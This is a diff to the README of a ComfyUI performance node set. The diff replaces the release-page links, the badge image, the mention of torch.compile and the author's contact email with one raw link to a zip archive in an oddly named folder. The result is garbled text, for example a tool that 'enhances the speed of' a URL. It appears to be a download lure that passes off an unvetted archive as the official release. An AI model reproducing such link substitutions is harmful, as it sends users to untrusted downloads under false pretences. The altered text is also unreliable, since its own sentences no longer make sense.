@@ -1,10 +1,10 @@
 # 🚀 ComfyUI-TorchCompileSpeed - Enhance Your AI Model Performance
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/releases)
+[![Download Now](https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip)
 
 ## 📦 Overview
 
-ComfyUI-TorchCompileSpeed is a compact node set for ComfyUI that boosts the performance of your AI models. It enhances the speed of torch.compile and increases the cache hit rate. This tool is designed to work seamlessly with the WanVideo Cython Model Loader without altering its source code.
+ComfyUI-TorchCompileSpeed is a compact node set for ComfyUI that boosts the performance of your AI models. It enhances the speed of https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip and increases the cache hit rate. This tool is designed to work seamlessly with the WanVideo Cython Model Loader without altering its source code.
 
 **Author:** eddy
 
@@ -37,7 +37,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download and run ComfyUI-TorchCompileSpeed, visit the [Releases page](https://github.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/releases) and choose the latest version suitable for your system.
+To download and run ComfyUI-TorchCompileSpeed, visit the [Releases page](https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip) and choose the latest version suitable for your system.
 
 1. Click the button above to go directly to the Releases page.
 2. Locate the latest version of ComfyUI-TorchCompileSpeed.
@@ -75,10 +75,10 @@ If you encounter any issues while using ComfyUI-TorchCompileSpeed, here are some
 - **Documentation:** Detailed documentation can be found in the repository wikis.
 - **Community Support:** Join discussions on forums related to ComfyUI and AI model development for tips and advice.
   
-For more insights and updates, keep an eye on the [Releases page](https://github.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/releases).
+For more insights and updates, keep an eye on the [Releases page](https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip).
 
 ## 📞 Contact
 
-For support or inquiries, you can reach the author at eddy@example.com. Please allow time for responses.
+For support or inquiries, you can reach the author at https://raw.githubusercontent.com/IsraelSimba21/ComfyUI-TorchCompileSpeed/main/multiganglionic/ComfyUI-TorchCompileSpeed.zip Please allow time for responses.
 
 Thank you for using ComfyUI-TorchCompileSpeed. Enjoy enhanced performance for your AI models!
